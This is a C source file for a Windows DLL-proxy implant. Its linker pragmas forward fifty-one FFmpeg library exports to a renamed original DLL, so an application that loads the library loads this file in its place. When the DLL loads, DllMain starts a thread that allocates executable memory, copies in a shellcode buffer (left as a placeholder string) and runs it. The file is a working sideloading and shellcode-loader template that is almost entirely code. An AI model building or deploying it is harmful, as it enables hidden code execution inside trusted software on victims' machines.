#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:av_buffer_create=payload.av_buffer_create,@1")
#pragma comment(linker, "/export:av_buffer_get_opaque=payload.av_buffer_get_opaque,@2")
#pragma comment(linker, "/export:av_dict_count=payload.av_dict_count,@3")
#pragma comment(linker, "/export:av_dict_free=payload.av_dict_free,@4")
#pragma comment(linker, "/export:av_dict_get=payload.av_dict_get,@5")
#pragma comment(linker, "/export:av_dict_set=payload.av_dict_set,@6")
#pragma comment(linker, "/export:av_force_cpu_flags=payload.av_force_cpu_flags,@7")
#pragma comment(linker, "/export:av_frame_alloc=payload.av_frame_alloc,@8")
#pragma comment(linker, "/export:av_frame_clone=payload.av_frame_clone,@9")
#pragma comment(linker, "/export:av_frame_free=payload.av_frame_free,@10")
#pragma comment(linker, "/export:av_frame_unref=payload.av_frame_unref,@11")
#pragma comment(linker, "/export:av_free=payload.av_free,@12")
#pragma comment(linker, "/export:av_get_bytes_per_sample=payload.av_get_bytes_per_sample,@13")
#pragma comment(linker, "/export:av_get_cpu_flags=payload.av_get_cpu_flags,@14")
#pragma comment(linker, "/export:av_image_check_size=payload.av_image_check_size,@15")
#pragma comment(linker, "/export:av_init_packet=payload.av_init_packet,@16")
#pragma comment(linker, "/export:av_log_set_level=payload.av_log_set_level,@17")
#pragma comment(linker, "/export:av_malloc=payload.av_malloc,@18")
#pragma comment(linker, "/export:av_max_alloc=payload.av_max_alloc,@19")
#pragma comment(linker, "/export:av_new_packet=payload.av_new_packet,@20")
#pragma comment(linker, "/export:av_packet_copy_props=payload.av_packet_copy_props,@21")
#pragma comment(linker, "/export:av_packet_get_side_data=payload.av_packet_get_side_data,@22")
#pragma comment(linker, "/export:av_packet_unref=payload.av_packet_unref,@23")
#pragma comment(linker, "/export:av_rdft_calc=payload.av_rdft_calc,@24")
#pragma comment(linker, "/export:av_rdft_end=payload.av_rdft_end,@25")
#pragma comment(linker, "/export:av_rdft_init=payload.av_rdft_init,@26")
#pragma comment(linker, "/export:av_read_frame=payload.av_read_frame,@27")
#pragma comment(linker, "/export:av_rescale_q=payload.av_rescale_q,@28")
#pragma comment(linker, "/export:av_samples_get_buffer_size=payload.av_samples_get_buffer_size,@29")
#pragma comment(linker, "/export:av_seek_frame=payload.av_seek_frame,@30")
#pragma comment(linker, "/export:av_strerror=payload.av_strerror,@31")
#pragma comment(linker, "/export:avcodec_align_dimensions=payload.avcodec_align_dimensions,@32")
#pragma comment(linker, "/export:avcodec_alloc_context3=payload.avcodec_alloc_context3,@33")
#pragma comment(linker, "/export:avcodec_decode_video2=payload.avcodec_decode_video2,@34")
#pragma comment(linker, "/export:avcodec_descriptor_get=payload.avcodec_descriptor_get,@35")
#pragma comment(linker, "/export:avcodec_descriptor_next=payload.avcodec_descriptor_next,@36")
#pragma comment(linker, "/export:avcodec_find_decoder=payload.avcodec_find_decoder,@37")
#pragma comment(linker, "/export:avcodec_flush_buffers=payload.avcodec_flush_buffers,@38")
#pragma comment(linker, "/export:avcodec_free_context=payload.avcodec_free_context,@39")
#pragma comment(linker, "/export:avcodec_get_name=payload.avcodec_get_name,@40")
#pragma comment(linker, "/export:avcodec_open2=payload.avcodec_open2,@41")
#pragma comment(linker, "/export:avcodec_parameters_to_context=payload.avcodec_parameters_to_context,@42")
#pragma comment(linker, "/export:avcodec_receive_frame=payload.avcodec_receive_frame,@43")
#pragma comment(linker, "/export:avcodec_send_packet=payload.avcodec_send_packet,@44")
#pragma comment(linker, "/export:avformat_alloc_context=payload.avformat_alloc_context,@45")
#pragma comment(linker, "/export:avformat_close_input=payload.avformat_close_input,@46")
#pragma comment(linker, "/export:avformat_find_stream_info=payload.avformat_find_stream_info,@47")
#pragma comment(linker, "/export:avformat_free_context=payload.avformat_free_context,@48")
#pragma comment(linker, "/export:avformat_open_input=payload.avformat_open_input,@49")
#pragma comment(linker, "/export:avio_alloc_context=payload.avio_alloc_context,@50")
#pragma comment(linker, "/export:avio_close=payload.avio_close,@51")

void runner(void) 
{
	unsigned char buf[] = "x86_SHELLCODE_HERE";
	int buf_len = (int)sizeof(buf);
	
	LPVOID addr;
	LPVOID hThread;
	
	// Allocate readable, writable, and executable memory
	addr = VirtualAlloc(NULL, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// Copy shellcode into the allocated buffer
	memcpy(addr, buf, buf_len);
	
	// Execute the shellcode
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0);
	WaitForSingleObject(hThread, -1);
}


BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE thread1
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		{
			thread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runner, NULL, 0, 0);
			CloseHandle(thread1);
		}
		case DLL_THREAD_ATTACH:	
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
